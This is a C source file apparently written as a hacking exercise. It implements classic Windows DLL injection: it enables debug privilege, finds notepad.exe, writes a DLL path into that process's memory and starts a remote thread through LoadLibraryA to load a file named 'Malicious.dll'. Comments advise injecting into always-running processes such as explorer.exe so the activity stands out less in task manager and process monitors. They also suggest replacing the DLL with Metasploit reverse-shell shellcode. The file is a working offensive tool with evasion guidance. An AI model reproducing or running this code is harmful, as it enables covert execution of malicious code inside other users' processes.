#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <winbase.h>
#include <tlhelp32.h>

// Enabling SEdebugPriv to acquire Handles for highly privileged processes
void EnableDebugPriv(int pid)
{

    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkp;

    hToken = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        printf("OpenProcessToken error: %d \n", GetLastError());

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
        printf("LookupPrivilegeValue error: %d \n", GetLastError());

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = luid;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL))
        printf("AdjustTokenPrivileges error: %d \n", GetLastError());

    CloseHandle(hToken);
}

// Finding the Pid of the process specified in the char , make sure that the specified process is currently running
//  or use an always running process like Explorer.exe in order to make it less obvious in task manager , process monitor , process hacker,etc

int findPid(const char *procname)
{
    HANDLE hSnapshot;
    PROCESSENTRY32 pe;
    int pid;
    BOOL Result;

    if (!(hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)))
        printf(" Error Creating A Snapshot : %d \n", GetLastError());

    pe.dwSize = sizeof(PROCESSENTRY32);

    if (!(Result = Process32First(hSnapshot, &pe)))
        printf("Error Finding First Process : %d \n", GetLastError());

    while (Result)
    {
        if (strcmp(procname, pe.szExeFile) == 0)
        {
            pid = pe.th32ProcessID;
            break;
        }
        Result = Process32Next(hSnapshot, &pe);
    }

    CloseHandle(hSnapshot);

    return pid;
}

// Allocating memory in the target process, creating a remote thread to execute our injected DLL or Shellcode
void ProcInject(DWORD pid, char *DLLpath)
{
    HANDLE hToken, hThread;
    HANDLE hProc, BadProcess;
    DWORD Status;
    LPVOID BaseAddress = NULL;

    hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    if (!hProc)
    {
        printf("  Error opening process : %d \n", GetLastError());
    }
    BaseAddress = VirtualAllocEx(hProc, NULL, strlen(DLLpath), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (!BaseAddress)
    {
        printf(" Error Allocating Memory : %d \n", GetLastError());
    }

    Status = WriteProcessMemory(hProc, BaseAddress, DLLpath, strlen(DLLpath), NULL);

    if (!Status)
    {
        printf(" Error Writing Process Memory : %d \n ", GetLastError());
    }
    // Note that Kernel32 is responsible for memory management in windows and supposed to be loaded into a protected memory
    // the loadlibraryA Loads the specified module into the address space of the calling process. its addr us the same in all processes
    // so we will piggy back its addr as a startig point

    LPVOID LoadDllAddress = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA");

    if (!LoadDllAddress)
    {
        printf(" Error Creating RemoteThread Address : %d \n", GetLastError());
    }

    hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)LoadDllAddress, BaseAddress, 0, NULL);

    if (!hThread)
    {
        printf(" Error Creating Remote Thread in process : %d \n", GetLastError());
    }
    else
    {
        printf(" DLL injected Succsesfully into Target Process \n");
    }
    CloseHandle(hProc);
}

int main()
{
    // Instead of specifying a dll file for injection you can put a Shellcode for a reverse shell generated by Metasploit for example in the dll string
    // tweak the code a bit in the functions above to allocate space for the shell code to be ran in the created Thread.

    char dll[100] = "C:\\Users\\admin\\Downloads\\HACKING101\\Malicious\\x64\\Debug\\Malicious.dll";
    int pid;
    pid = findPid("notepad.exe");
    // EnableDebugPriv(pid);
    ProcInject(pid, dll);
    return (0);
}